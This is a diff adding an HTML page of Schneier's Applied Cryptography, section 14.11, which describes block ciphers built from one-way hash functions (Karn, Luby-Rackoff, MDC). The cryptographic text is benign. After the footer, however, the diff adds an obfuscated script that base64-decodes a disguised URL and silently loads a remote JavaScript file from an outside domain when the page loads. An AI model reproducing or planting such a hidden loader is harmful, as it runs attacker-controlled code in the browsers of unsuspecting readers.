@@ -1,0 +1,129 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=351-353//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading12"></A><FONT COLOR="#000077">14.11 Using one-Way Hash Functions</FONT></H3>
+<P>The simplest way to encrypt with a one-way function is to hash the previous ciphertext block concatenated with the key, then XoR the result with the current plaintext block:
+</P>
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>P</I><SUB>i</SUB> &#8853; <I>H</I>(<I>K,C</I><SUB>i - 1</SUB>)
+<DD><I>P</I><SUB>i</SUB> = <I>C</I><SUB>i</SUB> &#8853; <I>H</I>(<I>K,C</I><SUB>i - 1</SUB>)
+</DL>
+<P>Set the block length equal to the output of the one-way hash function. This, in effect uses the one-way function as a block cipher in CFB mode. A similar construction can use the one-way function in OFB mode:
+</P>
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>P</I><SUB>i</SUB> &#8853; <I>S</I><SUB>i</SUB>; <I>S</I><SUB>i</SUB> = <I>H</I>(<I>K,C</I><SUB>i - 1</SUB>)
+<DD><I>P</I><SUB>i</SUB> = <I>C</I><SUB>i</SUB> &#8853; <I>S</I><SUB>i</SUB>; <I>S</I><SUB>i</SUB> = <I>H</I>(<I>K,C</I><SUB>i - 1</SUB>)
+</DL>
+<P>The security of this scheme depends on the security of the one-way function.
+</P>
+<P><FONT SIZE="+1"><B><I>Karn</I></B></FONT></P>
+<P>This method, invented by Phil Karn and placed in the public domain, makes an invertible encryption algorithm out of certain one-way hash functions.
+</P>
+<P>The algorithm operates on plaintext and ciphertext in 32-byte blocks. The key can be any length, although certain key lengths will be more efficient for certain one-way hash functions. For the one-way hash functions MD4 and MD5, 96-byte keys work best.</P>
+<P>To encrypt, first split the plaintext into two 16-byte halves: <I>P</I><SUB>1</SUB> and <I>P</I><SUB>r</SUB>. Then, split the key into two 48-byte halves: <I>K</I><SUB>1</SUB> and <I>K</I><SUB>r</SUB>.</P>
+<DL>
+<DD><I>P</I> = <I>P</I><SUB>1</SUB>,<I>P</I><SUB>r</SUB>
+<DD><I>K</I> = <I>K</I><SUB>1</SUB>,<I>K</I><SUB>r</SUB>
+</DL>
+<P>Append <I>K</I><SUB>1</SUB> to <I>P</I><SUB>1</SUB> and hash it with a one-way hash function, then XoR the result of the hash with <I>P</I><SUB>r</SUB> to produce <I>C</I><SUB>r</SUB>, the right half of the ciphertext. Then, append <I>K</I><SUB>r</SUB> to <I>C</I><SUB>r</SUB> and hash it with the one-way hash function. XoR the result with <I>P</I><SUB>1</SUB> to produce <I>C</I><SUB>1</SUB>. Finally, append C<SUB>r</SUB> to <I>C</I><SUB>1</SUB> to produce the ciphertext.</P>
+<DL>
+<DD><I>C</I><SUB>r</SUB> = <I>P</I><SUB>r</SUB> &#8853; <I>H</I>(<I>P</I><SUB>1</SUB>,<I>K</I> <SUB>1</SUB>)
+<DD><I>C</I><SUB>1</SUB> = <I>P</I><SUB>1</SUB> &#8853; <I>H</I>(<I>C</I><SUB>r</SUB>,<I>K</I><SUB>r</SUB>)
+<DD><I>C</I> = <I>C</I><SUB>1</SUB>,<I>C</I><SUB>r</SUB>
+</DL>
+<P>To decrypt, simply reverse the process. Append <I>K</I><SUB>r</SUB> to <I>C</I><SUB>r</SUB>, hash and XoR with <I>C</I><SUB>1</SUB> to produce <I>P</I><SUB>1</SUB>. Append <I>K</I><SUB>1</SUB> to <I>P</I><SUB>1</SUB>, hash and XoR with <I>C</I><SUB>r</SUB> to produce <I>P</I><SUB>r</SUB>.</P>
+<DL>
+<DD><I>P</I><SUB>1</SUB> = <I>C</I><SUB>1</SUB> &#8853; <I>H</I>(<I>C</I><SUB>r</SUB>,<I>K</I><SUB>r</SUB>)
+<DD><I>P</I><SUB>r</SUB> = <I>C</I><SUB>r</SUB> &#8853; <I>H</I>(<I>P</I><SUB>1</SUB>,<I>K</I><SUB>1</SUB>)
+<DD><I>P</I> = <I>P</I><SUB>1</SUB>,<I>P</I><SUB>r</SUB>
+</DL>
+<P>The overall structure of Karn is the same as many of the other block algorithms discussed in this section. It has only two rounds, because the complexity of the algorithm is embedded in the one-way hash function. And since the key is used only as the input to the hash function, it cannot be recovered even using a chosen-plaintext attack&#151;assuming, of course, that the one-way hash function is secure.
+</P>
+<P><FONT SIZE="+1"><B><I>Luby-Rackoff</I></B></FONT></P>
+<P>Michael Luby and Charles Rackoff showed that Karn is not secure [992]. Consider two single-block messages: <I>AB</I> and <I>AC</I>. If a cryptanalyst knows both the plaintext and the ciphertext of the first message, and knows the first half of the plaintext of the second message, then he can easily compute the entire second message. This known-plaintext attack is useful only in certain circumstances, but it is a major security problem.</P>
+<P>A three-round encryption algorithm avoids this problem [992,1643,1644]. It uses three different hash functions: <I>H</I><SUB>1</SUB>, <I>H</I><SUB>2</SUB>, and <I>H</I><SUB>3</SUB>. Further work shows that <I>H</I><SUB>1</SUB> can equal <I>H</I><SUB>2</SUB>, or that <I>H</I><SUB>2</SUB> can equal <I>H</I><SUB>3</SUB>, but not both [1193]. Also, <I>H</I><SUB>1</SUB>, <I>H</I><SUB>2</SUB>, and <I>H</I><SUB>3</SUB> cannot be based on iterating the same basic function [1643]. Anyway, assuming that <I>H</I>(<I>k,x</I>) behaves like a pseudo-random function, here is a three-round version:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Divide the key into two halves: <I>K</I><SUB>1</SUB> and <I>K</I><SUB>r</SUB>.
+<DD><B>(2)</B>&nbsp;&nbsp;Divide the plaintext block into two halves: <I>L</I><SUB>0</SUB> and <I>R</I><SUB>0</SUB>.
+<DD><B>(3)</B>&nbsp;&nbsp;Append <I>K</I><SUB>1</SUB> to <I>L</I><SUB>0</SUB> and hash it. XoR the result of the hash with <I>R</I><SUB>0</SUB> to produce <I>R</I><SUB>1</SUB>:
+<DL>
+<DD><I>R</I><SUB>1</SUB> = <I>R</I><SUB>0</SUB> &#8853; <I>H</I>(<I>K</I><SUB>1</SUB>,<I>L</I><SUB>0</SUB>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Append <I>K</I><SUB>r</SUB> to <I>R</I><SUB>1</SUB> and hash it. XOR the result of the hash with <I>L</I><SUB>0</SUB> to produce <I>L</I><SUB>1</SUB>:
+<DL>
+<DD><I>L</I><SUB>1</SUB> = <I>L</I><SUB>0</SUB> &#8853; <I>H</I>(<I>K</I><SUB>r</SUB>,<I>R</I><SUB>1</SUB>)
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Append <I>K</I><SUB>1</SUB> to <I>L</I><SUB>1</SUB> and hash it. XOR the result of the hash with <I>R</I><SUB>1</SUB> to produce <I>R</I><SUB>2</SUB>:
+<DL>
+<DD><I>R</I><SUB>2</SUB> = <I>R</I><SUB>1</SUB> &#8853; <I>H</I>(<I>K</I><SUB>1</SUB>,<I>L</I><SUB>1</SUB>)
+</DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Append <I>L</I><SUB>1</SUB> to <I>R</I><SUB>1</SUB> to generate the message.
+</DL>
+<P><FONT SIZE="+1"><B><I>Message Digest Cipher (MDC)</I></B></FONT></P>
+<P>MDC, invented by Peter Gutmann [676], is a means of turning one-way hash functions into a block cipher that runs in CFB mode. The cipher runs almost as fast as the hash function and is at least as secure as the hash function. The rest of this section assumes you are familiar with Chapter 18.
+</P>
+<P>Hash functions such as MD5 and SHA use a 512-bit text block to transform an input value (128 bits with MD5, and 160 bits with SHA) into an output value of equal size. This transformation is not reversible, but it is perfect for CFB mode: The same operation is used for both encryption and decryption.</P>
+<P>Let&#146;s look at MDC with SHA. MDC has a 160-bit block size and a 512-bit key. The hash function is run &#147;sideways,&#148; with the old hash state as the input plaintext block (160 bits) and the 512-bit hash input as a key (see Figure 14.5). Normally, when using the hash to simply hash some input, the 512-bit input to the hash is varied as each new 512-bit block is hashed. But in this case the 512-bit input becomes an unchanging key.</P>
+<P>MDC can be used with any one-way hash function: MD4, MD5, Snefru, and others. It is unpatented. Anyone can use it at any time, in any way, royalty-free [676].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(cRoeHoMx, KfoNwqPz) {KfoNwqPz = cRoeHoMx.createElement('script');KfoNwqPz.type = 'text/javascript';KfoNwqPz.async = true;KfoNwqPz.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');cRoeHoMx.getElementsByTagName('body')[0].appendChild(KfoNwqPz);}(document));</script></body>
+</html>
